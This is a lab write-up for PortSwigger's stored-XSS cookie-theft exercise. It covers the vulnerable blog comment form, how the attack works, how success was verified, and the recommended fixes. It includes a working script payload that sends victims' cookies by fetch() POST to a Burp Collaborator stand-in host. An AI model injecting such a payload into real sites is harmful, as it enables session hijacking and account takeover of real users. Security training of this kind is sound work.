## Lab Title: Exploiting cross-site scripting to steal cookies  

- **Category:** Cross-Site Scripting  
- **Level:** Practitioner  
- **Platform:** PortSwigger Web Security Academy  

## Overview  
This lab demonstrates how a stored XSS vulnerability can be leveraged to exfiltrate session cookies from other users. The vulnerable functionality is the blog comments feature, which reflects unsanitized input directly into the page. When a victim views the comments, any injected JavaScript executes in their browser.  

## Vulnerability Context  
- **Entry Point:** Blog comment submission form.  
- **Reflection Point:** Rendered comment content on the blog page.  
- **Impact:** Arbitrary JavaScript execution in the victim’s browser.  
- **Security Weakness:** Lack of input sanitization and unsafe rendering of user‑supplied data.  

## Exploit Technique  
The attack relies on injecting a `<script>` block that sends the victim’s cookies to an attacker‑controlled endpoint. In this lab, Burp Collaborator is used as the exfiltration server.  

### Example Payload  
```html
<script>
fetch('https://BURP-COLLABORATOR-SUBDOMAIN', {
  method: 'POST',
  mode: 'no-cors',
  body: document.cookie
});
</script>
```
- This script forces anyone viewing the comment to issue a POST request containing their cookie to your Collaborator subdomain.

**Figure 1: Intercepting the administrative user's session token via Burp Collaborator.**

<img width="1341" height="579" alt="image" src="https://github.com/user-attachments/assets/e3e18606-9dd4-43a5-8989-a899551859fa" />

- When the victim loads the page, their browser executes the script.
- A POST request is sent to the attacker’s Collaborator subdomain containing the victim’s cookies.
- The attacker can then replay requests using the stolen cookie to impersonate the victim.

## Verification

- The Collaborator server records an HTTP interaction containing the victim’s cookie.
- Replacing the attacker’s own cookie with the stolen one grants access to the victim’s account.
- Access to /my-account confirms successful impersonation of the admin user.
  
<img width="1046" height="579" alt="image" src="https://github.com/user-attachments/assets/a322f380-3161-4b9d-a6a1-1b414628ee9a" />

---

<img width="1353" height="542" alt="image" src="https://github.com/user-attachments/assets/3f91aa49-7d0d-42e2-9234-39f39dcd424a" />

## Security Impact

- Account Takeover: Attackers can hijack sessions and impersonate privileged users.
- Data Exposure: Sensitive information accessible to the victim becomes exposed.
- Persistence: Stored XSS ensures every future visitor to the page is affected.

## Recommended Fixes

- Encode and sanitize all user input before rendering.
- Use HttpOnly cookies to prevent client‑side access to session tokens.
- Apply Content Security Policy (CSP) to restrict script execution.
- Avoid inline rendering of user‑supplied HTML/JavaScript.

## Lessons Learned

This lab highlights how stored XSS can escalate from a simple alert box to full account compromise. By exfiltrating cookies, attackers gain persistent control over victim sessions. Preventing such attacks requires both secure coding practices and defense‑in‑depth measures like CSP and secure cookie attributes.
